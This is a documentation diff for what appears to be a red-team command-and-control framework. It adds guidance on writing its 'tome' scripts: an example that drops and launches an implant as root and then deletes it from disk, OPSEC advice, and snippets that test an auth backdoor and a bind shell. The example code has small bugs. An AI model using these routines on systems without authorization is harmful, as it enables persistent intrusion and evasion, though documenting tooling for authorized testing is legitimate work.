@@ -133,3 +133,115 @@ On GitHub, you can easily accomplish this by adding Tavern's public key for the 
 Now, all that's left is to click "Import tomes". If all goes well, your [Tomes](/user-guide/terminology#tome) will be added to Tavern and will be displayed on the view. If [Tomes](/user-guide/terminology#tome) are missing, be sure each [Tome](/user-guide/terminology#tome)  has a valid `metadata.yml` and `main.eldritch` file in the [Tome](/user-guide/terminology#tome) root directory.
 
 Anytime you need to re-import your [Tomes](/user-guide/terminology#tome) (for example, after an update), you may navigate to the "Tomes" page and click "Refetch tomes".
+
+## Tome writing best practices
+
+Writing tomes will always be specific to your use case. Different teams, different projects will prioritize different things. In this guide we'll prioritize reliability and safety at the expense of OPSEC.
+
+OPSEC considerations will tend towards avoiding calls to `shell` and `exec` instead using native functions to accomplish the function.
+
+In some situations you may also wish to avoid testing on target if that's the case you should test throughly off target before launching.
+
+If you test off target you can leverage native functions like [`sys.get_os`](/user-guide/eldritch#sysget_os) to ensure that your tome only runs against targets it's been tested on.
+
+### Example
+
+Copy and run an asset
+
+```python
+IMPLANT_ASSET_PATH = "tome_name/assets/implant"
+
+def main(dest_bin_path)
+    ## Testing
+
+    # Note that we're using multiple returns instead of
+    # nesting if statements. This style is to ensule 
+    # line of sight readability when reviewing code.
+    if not sys.is_linux():
+      print("[error] tome only supports linux")
+      return
+    
+    cur_user = sys.get_user()
+    if cur_user['euid']['uid'] != 0:
+      print(f"[error] tome must be run as root / uid 0 not {cur_user}")
+      return
+
+    # Validate the destination directory exists
+    if not file.is_dir(file.parent_dir(dest_bin_path)):
+      print(f"[error] path {dest_bin_path} parent isn't a directory")
+      return
+
+    if file.is_file(dest_bin_path):
+      print(f"[error] path {dest_bin_path} already exists")
+      return
+
+    does_chmod_exist = sys.shell(f"command -v chmod")
+    if does_chmod_exist['status'] != 0:
+        print(f"[error] tome requires `chmod` be available in PATH")
+        return
+
+    ## Deploy
+
+    assets.copy(IMPLANT_ASSET_PATH, dest_bin_path)
+
+    set_perms = sys.shell(f"chmod +x {dest_bin_path}")
+    if setting_chmod['status'] != 0:
+      print(f"[error] chmod failed to set perms {set_perms} cleaning up")
+      file.remove(dest_bin_path)
+      return
+
+    # Launch bin disowned and backgrounded
+    res = sys.exec(dest_bin_path, [], True)
+    if res['status'] != 0:
+      print(f"[error] exec {dest_bin_path} failed {res} cleaning up")
+      file.remove(dest_bin_path)
+      return
+
+    ## Cleanup
+    file.remove(dest_bin_path)
+
+    print(f"[success] process launched")
+
+
+main()
+```
+
+### Fail early
+Before modifying anything on Target or loading assets validate that the tome you're building will run as expected.
+This avoids artifacts being left on disk if something fails and also provides verbose feedback in the event of an error to reduce trouble shooting time.
+
+Common things to validate:
+- Operating systems - all tomes are cross platform so it's up to the tome developer to fail if run on an unsupported OS
+- Check parent directory exists using [`fileparent_dir`](/user-guide/eldritch#fileparent_dir) 
+- User permissions
+- Required dependencies or LOLBINs
+
+**Note on `eprint`: eprint has bugs causing tomes to exit prematurely. Currently best practice is to avoid using it.**
+
+### Backup and Test
+If you need to modify configuration that might cause breaking changes to the system.
+It's recommended that you create a backup, modify the config, and validate your change.
+If something fails during validation replace the original config.
+
+This might look like:
+```python
+file.copy(config_path, f"{config_path}.bak")
+
+if not end_to_end_test():
+    print("[error] end to end test failed cleaning up")
+    file.remove(config_path)
+    file.moveto(f"{config_path}.bak", config_path)
+    return
+
+file.remove(f"{config_path}.bak")
+```
+
+End to end test can validate the backdoor - if possible validate normal system functionality.
+
+```python
+# Auth backdoor - drop to a user account or `nobody` and then auth to a user account
+sys.shell(f"echo -e '{password}\n{password}\n' | su {user} -c 'su {user} -c id'")
+
+# Bind shell - check against localhost
+res = sys.shell(f"{shell_client} 127.0.0.1 id")
+```
